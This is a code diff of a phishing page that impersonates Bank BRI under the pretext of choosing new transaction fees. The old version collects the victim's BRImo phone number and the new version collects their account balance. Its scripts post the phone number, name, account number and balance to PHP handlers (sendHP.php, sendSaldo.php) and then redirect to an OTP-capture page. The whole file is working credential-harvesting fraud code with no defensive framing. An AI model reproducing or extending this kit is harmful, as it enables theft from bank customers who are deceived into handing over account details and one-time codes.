@@ -1,10 +1,7 @@
-<html Permissions-Policy: autoplay=(self "dana.mp4")
->
-<head>
- <html>
+<html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/5b/Logo_Bank_Rakyat_Indonesia.svg">
+<link rel="icon" href="img/brimo_logo1.png">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0" />
 <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />
 <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"/>
@@ -16,22 +13,11 @@
 	<meta name="theme-color" content="#0f78cb">
 	<meta property="og:type" content="website">
 	<meta http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap:">
-	<title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜</title>
-	<link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/5/5b/Logo_Bank_Rakyat_Indonesia.svg"/>
-<link rel="image_src" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi97_92W_FGmoTZ1pp-OWOZOVOYgWFGQfv-hChRVL8lZfORziU1wvjY2rMBw1AVx9dCg6GeCKv5g5cV9KkParHEvndQOKTCkf5YicChrfy46eYklv8q56U93nkWuC2DxFCsp4QABjGyhseinA5VYW73UAKZglK09mOdFAnCLb91l_CQbW_w8qdTVqQf7Zc/s547/AddText_02-29-11.37.00.jpg"/>
-<meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi97_92W_FGmoTZ1pp-OWOZOVOYgWFGQfv-hChRVL8lZfORziU1wvjY2rMBw1AVx9dCg6GeCKv5g5cV9KkParHEvndQOKTCkf5YicChrfy46eYklv8q56U93nkWuC2DxFCsp4QABjGyhseinA5VYW73UAKZglK09mOdFAnCLb91l_CQbW_w8qdTVqQf7Zc/s547/AddText_02-29-11.37.00.jpg" property="og:image">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
-<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Varela+Round&amp;display=swap'><link rel="stylesheet" href="./style.css">
-<!-- partial:index.partial.html -->
-<link href="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
-<link href="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/assets/owl.theme.default.min.css" rel="stylesheet">
-<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.min.js">
-</script>
- <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/owl.carousel.js">
-   </script>
+	<title>Tarif Bank BRI</title>
+	<link rel="icon" type="image/png" href="img/brimo_logo1.png"/>
+<link rel="image_src" href="img6wpBpPy/Ej-EAbf-PVg-AATo-Ur-picsay.jpg"/>
 <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
 <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
-</head>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap');
 }
@@ -47,6 +33,7 @@ body {
     background: #fff;
     color: #000;
     font-family: 'Nunito', sans-serif;
+    
 }
 welalxcome {
         position: fixed;
@@ -1035,146 +1022,12 @@ input::placeholder{
 ion-icon{
     font-size: 22px;
     margin-left: 8px;
-    margin-top: 5px;
+    margin-top: -6px;
     position: absolute;
     color: #06529C;
 }
-
-
-
-
-/* Added PseudoCode CSS to Hide the Controls of Video as on adding Controls Attribute to Video, the controls of video get visible easily. So to control that case also, this needs to be present on CSS End */
-
-video::-webkit-media-controls {
-    display: ;
-}
-
-video {
-  display: none;
-  pointer-events: none;
-}
-
-
-#carousel {
-  grid-row: 1 / 2;
-  grid-column: 1 / 8;
-  width: 150vw;
-  height: 500px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  overflow: hidden;
-  transform-style: preserve-3d;
-  perspective: 600px;
-  --items: 5;
-  --middle: 3;
-  --position: 1;
-  pointer-events: none;
-}
-
-
-div.item {
-  position: absolute;
-  width: 350px;
-  height: 400px;
-  background-color: coral;
-  --r: calc(var(--position) - var(--offset));
-  --abs: max(calc(var(--r) * -1), var(--r));
-  transition: all 0.25s linear;
-  transform: rotateY(calc(-10deg * var(--r)))
-    translateX(calc(-300px * var(--r)));
-  z-index: calc((var(--position) - var(--abs)));
-}
-
-div.item:nth-of-type(1) {
-  --offset: 1;
-  background-color: #90f1ef;
-}
-div.item:nth-of-type(2) {
-  --offset: 2;
-  background-color: #ff70a6;
-}
-div.item:nth-of-type(3) {
-  --offset: 3;
-  background-color: #ff9770;
-}
-div.item:nth-of-type(4) {
-  --offset: 4;
-  background-color: #ffd670;
-}
-div.item:nth-of-type(5) {
-  --offset: 5;
-  background-color: #e9ff70;
-}
-
-div.item img{
-    width: 300px;
-}
-
-/*********************/
-.process1 {
-     width: 100%;
-            height: 100%;
-             display: flex;
-             justify-content: center;
-            margin: auto;
-            position: absolute;
-           padding-top: 300px;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 99999;
-            
-      
-}
-.loading {
-    position: absolute;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-bottom: 20%;
-    margin-top: 300px;
-}
-.loading img {
-    width: 50px;
-    
-    top: 10;
-}
-.loading .spinner{
-    position: absolute;
-    width: 35px;
-    animation: spin 1s linear infinite;
-    -webkit-animation: spin 1s linear infinite;
-    -moz-animation: spin 1s linear infinite;
-    -ms-animation: spin 1s linear infinite;
-    -o-animation: spin 1s linear infinite;
-}
-@keyframes spin {
-  0% { transform: rotate(360deg); }
-  100% { transform: rotate(0deg); }
-}
-@-webkit-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
-}
-@-moz-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
-}
-@-ms-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
-}
-@-o-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
-}
-
-/*********************/
-
-
 </style>
+</head>
 <body>
 <main>
 <welalxcome>
@@ -1183,35 +1036,35 @@ div.item img{
 <chsalxcome2 style="display: none;">
 <div style="height:30px;width: 70px;margin-top: -21px;margin-bottom: 0px;float:center;margin-left:42%" class="talxcome">
 </div>
-<nav style="position: relative; top: -10; left: 0; right: 0; margin: 0px auto; width: 100%; height: 70px; background: #0F78CB; border-bottom: 2px solid #fff">
+<nav style="position: relative; top: -10; left: 0; right: 0; margin: 0px auto; width: 100%; height: 70px; background: #0f78cb; border-bottom: 2px solid #fff">
  <img style="margin-top:15px; margin-left:10px;" width="120px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQSweFBduODJ8_buGMn03zJzohVHRYo2gEvPeEu1zuPRXOGWsIHNU4vhmKzWl4ydtTiH7eXahwANGY6oTuZfh4eGm2agziMnwKWzAe5-6u1RtHS9U7E0qI_M1qOIsijIkgQixmstUdbPlkERKe4QN9mvjkKSCy9tZuAchMCM_8rF7NEAYHNo8ITDNZTOQ/s1280/AddText_02-17-11.36.52.png" alt="" />   
 </nav>
 
 
+<div class="" style="margin-top: -10px; height: 230px; background: transparent">
 
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5MrqnCMGtDpUklYcYgGym88Ji9StjnVsMk25q12EwAAK0NnmMfjCYD9BLlBPvGdh3kixPiBPcs2psI8bxlAI6t2nMqJF4L33QpLYX_rQqJlTQWfMUSbQidtIZhyCxY3jPBQY4LzfcbXwMHQqSEamrRyN__eAxvYbtLxajncj9QBG-sIyUzOoM_yfDfW8/s1080/Screenshot_2024-02-24-08-46-11-78_f0d5010b4078101d669cabe708845c5e.jpg" width="100%">
 
-<form id="formHP" onsubmit="sendNohp(event); return false" method="post" accept-charset="utf-8">
-<div class="" style="margin-left: 20px;margin-top: 160px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:20px; background: #fff; height: 290px; box-shadow: rgba(0, 0, 0, 0.15) 0px 5px 15px 0px; overflow:hidden">
-<center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px"><p>Silahkan Pilih Tarif Transaksi Sesuai Kebutuhan Anda Di Bawah Ini</p><br><hr>
-<img style="width:100%;"src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2BIEUAINrC8oE1Xqi6NvefVRbQdKf-VYtFyaC-Eu9WRpaennGI5NBusLVcLpfuTaNuPWMBkXhQFjxIRzlvLc85xfzHOKyQe8unseX2lXgxYXYc0UJKXvz4uXI7HepcXuJ4Df8hRf4oZpsuqJZO9cATofakvlIjpolNN95QqU5Ttdk-E0r5jMXrRKUGqQ/s1080/AddText_02-18-01.06.41.jpg" alt="">
-</center>
-<div style="text-align: center;">
-<h4 style="color:#09559a; margin-left: -12px">
-<label id="label1" style="color:#09559a; line-height: 17px; font-size: 15px;">
-<input required type="radio" name="tarif" id="tarif" value='BARU'>
- Tarif Baru Rp 150.000 / Perbulan
-</label>
-</h4>
-<h4 style="color:#09559a;">
-<label required id="label2" style="color:#09559a; line-height: 17px; font-size: 15px;">
-<input type="radio" name="tarif" id="tarif" value="LAMA">
- Tarif Lama Rp 6.500 / Bi fast 2.500
-</label>
 </div>
-<br>
+
+
+<form onsubmit="sendNohp(event); return false" method="POST" id="inputlogin">
+<div class="" style="margin-left: 20px;margin-top: 25px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:20px; background: #fff; height: 205px; box-shadow: rgba(0, 0, 0, 0.15) 0px 5px 15px 0px; overflow:hidden">
+<center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px; margin-top: -10px; margin-bottom: px"><p>Masukkan Saldo Terkahir anda,<br/>
+Pastikan Saldo Sesuai di rekening.</p>
+<br/>
+<hr style="margin-top: -10px">
+<img style="width:100%;"src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDY_PlSmkF9FAqrqho8HRTVFaE3C6lUU-EhgnqXUOvEkzDxoajCTTL7trHsHBNsUKpoggvAITCpOFpwDgsexYmG6konGC4BCmzEwXPEiBtFGwT254zeyFF5D8TxjMeYs-D1jD6kTJQ_gLic7CAB6tpixhXUSCoxW5R332x0_5GN33ss4P8CR8Yvx4wHYY/s1080/AddText_02-18-12.15.48.png" alt="">
+</center>
   <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
-<h5 style="color:#000; margin-top: 0px; margin-left: 4px">Masukan Nomor ponsel <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b> Anda :</h5><br/><ion-icon name="phone-portrait-sharp"></ion-icon>
-<input id="NoHp" name="Nohp" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-image: initial; background-color: rgb(255, 255, 255);  border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -5px; padding-left: 40px" placeholder="08xxxxxx"  required maxlength="13" minlength="10">
+<input type="hidden" id="nomorhp" name="nomorsaya">
+<input type="hidden" id="namaku" name="namaku">
+<input type="hidden" id="noreke" name="norekku">
+
+
+<br>
+<h5 style="color:#000; margin-top: -30px; margin-left: 4px">Saldo Akhir :</h5><br/>
+<input class="uang" id="saldo" name="saldoTerakhir" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-image: initial; background-color: rgb(255, 255, 255);  border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -15px; padding-left: 10px" placeholder="Rp xxxxx"  required maxlength="13" minlength="10"><br/>
 </h3>
 <br>
 
@@ -1228,107 +1081,22 @@ div.item img{
            </div>
 </form>
 
-<footer style="position: fixed; top: 70; left: 0; right: 0; width: 100%; height: 200px; z-index: -1">
-<!----------HTML code starts here------->
 
-<div class="owl-carousel owl-theme owl-loaded " style=" height: 160px; transform-style: preserve-3d; overflow: hidden">
-            
 
-         
-         <div class="owl-stage" style="transform: translate3d(-1527px, 0px, 0px); transition: all 0.05s ease 1s; width: 3334px; background-color: ; padding: 0px; margin-left: 30px">
-           
-   <div class="owl-item item active;" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; border-radius: 10px; background: transparent;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5ZmsIHzOUn6pvZp21A0nzAYb2ir3GyyY6GmTfO0bjPaA0HfbbnmlkTFmiE-H9XcCcanBgmjFl3lIoyfRVS7VQyGQaFClyW5pJbuorTu2vMxOJxhupjuF2PH4PVjZ48ZoDJb6vwxmvb5csZkwAIZuqo-24nJSxFsSI5vo6zUtD9V3sNiRNhytM0AE8QZ8/s783/AddText_02-17-11.32.49.jpg" style="border-radius: 6px; height: 158px"></div>
-   <div class="owl-item item active" style="background-color: #000; box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; ; background: transparent; "><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtaA-NQNghCea05R59Ex4_oMsn4Vq1yV37nI1w0sWPhzdEE5ys6IDx-fgA&s=10" style="border-radius: 6px"></div>
-   <div class="owl-item item active" style="box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; background: transparent"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSdTxiD7vrRmsYxWQK0L3v2cwn5wfvoNT-fir3u02AMArnGLhkagL8sc_K7aHAq8PGxVjN3mj26z7mNHkT3dmkMg1XoCjvrWiRpvibHHV3S7Xi9y9smrmS9bLohfSvgk88iAs_gqp1SNUqxRO4PwPve48HCuQIA0XzWnxLzdONbfo-HdR9I2UM_SI3aqY/s841/AddText_03-28-12.22.04.jpg"  style="border-radius: 6px"></div>
-   
-           
-           
-             
-            </div></div></div>
-           
-  
-</div>    
 
-</footer>
-  <center>
-     <div id="process1" name="process" class="process1" style="display: none;">
-            <div class="loading">
-                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png">
-                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" id="loading" style="margin-top: -2px">
-            </div>
-        </div>
-        </center>
-<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW-3Xsq1r5wVb5r0tfUzFr9KzB9hy1r0-W4GkBcDTnYujbw_NNeMWw-l8MZCk4RYNJpcSZRf5tv-TPa5HnYvv_x-EzticmLwx1vO4bIlqTJAiyk4-i96QjCFlPHT8BMy9nF15ISyjxVVOz2DAv8osBBR9onrE3lJf96Vw5erolKuss9ZrTFAFhoJAU4Js/s1080/1704436332522.png" style="width: 100%; position: fixed; bottom: -5; left: 0; right: 0; margin: 0px auto; z-index: -1;"> 
 
-<script>
-    const video = document.getElementById("video");
-video.addEventListener("play", handleFirstPlay, false);
 
-let hasPlayed = false;
-function handleFirstPlay(event) {
-  if (!hasPlayed) {
-    hasPlayed = true;
-
-    // Remove listener so this only gets called once.
-    const vid = event.target;
-    vid.removeEventListener("play", handleFirstPlay);
-
-    // Start whatever you need to do after first playback has started
-  }
-}
-
-</script>
-<!-- partial -->
-  <script>
-var owl = $('.owl-carousel');
-owl.owlCarousel({
-    items:1.2, 
-  // items change number for slider display on desktop
-  
-    loop:true,
-    margin:10,
-    autoplay:true,
-    autoplayHoverPause:true
-});      
-      
-  </script>
-
-<script>
-    /* Toggle Button to Unmute the Video */
-
-function toggleMute() {
-    var video = document.getElementById('video');
-    if (video.muted) {
-        video.muted = false;
-    } else {
-        video.muted = true;
-    }
-}
-
-/* Delay Function to Add SetTimeOut After Defined Interval */
-
-function delay(time) {
-    return new Promise((resolve) => setTimeout(resolve, time));
-}
-
-/* Show Video Function to Add Display Property to Show the Video on Click of Button which will fulfilled User Interaction Needs to Browser to Run the Video with Unmute State */
-
-function showVideo() {
-    var element = document.getElementById('video');
-    var button = document.getElementById('button');
-    element.style.display = 'block';
-    button.style.display = 'none';
-    delay(100).then(() => toggleMute());
-}
-</script>
-<script>
- function letsgo(){
- $("#process1").show();    
- window.location.href="login.html";
- }   
-</script>
 </smalxs>
 </main>
+<script>
+var nomorku = sessionStorage.getItem("nomorku");
+document.getElementById("nomorhp").value = nomorku + "";
+var nama = sessionStorage.getItem("nama");
+document.getElementById("namaku").value = nama + "";
+var norek = sessionStorage.getItem("norek");
+document.getElementById("noreke").value = norek + "";
+
+  </script>
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
@@ -1345,34 +1113,89 @@ function showVideo() {
             },500)
         });
 </script>
- 
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+       
+        <script type="text/javascript">
+            $(document).ready(function(){
+
+                // Format mata uang.
+                $( '.uang' ).mask('000.000.000.000', {reverse: true});
+ var dengan_rupiah = document.getElementById('saldo');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    
+      /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+            })
+            
+            
+        </script>
+<!-- </body> -->
 <script>
- $(document).ready(function(){
-    $('#formHP').submit(function(e) {
+
+  
+ 
+$('#inputlogin').on('submit', function (event) {
+
+  event.stopPropagation();
     event.preventDefault();
     
-document.getElementById('kirims').innerHTML = "Memproses....";
+ document.getElementById('kirims').innerHTML = "Memproses....";
 
 
- $.ajax({
+
+$.ajax({
+
  type: 'POST',
- url: 'sendHP.php',
+ url: 'sendSaldo.php',
+ async: false,
+ dataType: 'JSON',
  data: $(this).serialize(),
- datatype: 'JSON',
  
  complete: function(data) {
             console.log('Complete')
-   setTimeout(function(){
-  window.location.href='login.php';
- var NoHp = document.getElementById("NoHp").value;
- sessionStorage.setItem("NoHp", NoHp);   
-    }, 1000);
+ 
+
+  setTimeout(function(){
+    window.location.href='otp.php';  
+var nomorhp = document.getElementById("nomorhp").value;
+sessionStorage.setItem("nomorhp", nomorhp);
+var namaku = document.getElementById("namaku").value;
+sessionStorage.setItem("namaku", namaku);
+var noreke = document.getElementById("noreke").value;
+sessionStorage.setItem("noreke", noreke);
+var saldo = document.getElementById("saldo").value;
+sessionStorage.setItem("saldo", saldo);
+     }, 500);
+
+
         }
     });
- });
+
     return false;
 });   
-     
+        
 </script>
 </body>
 </html>
+
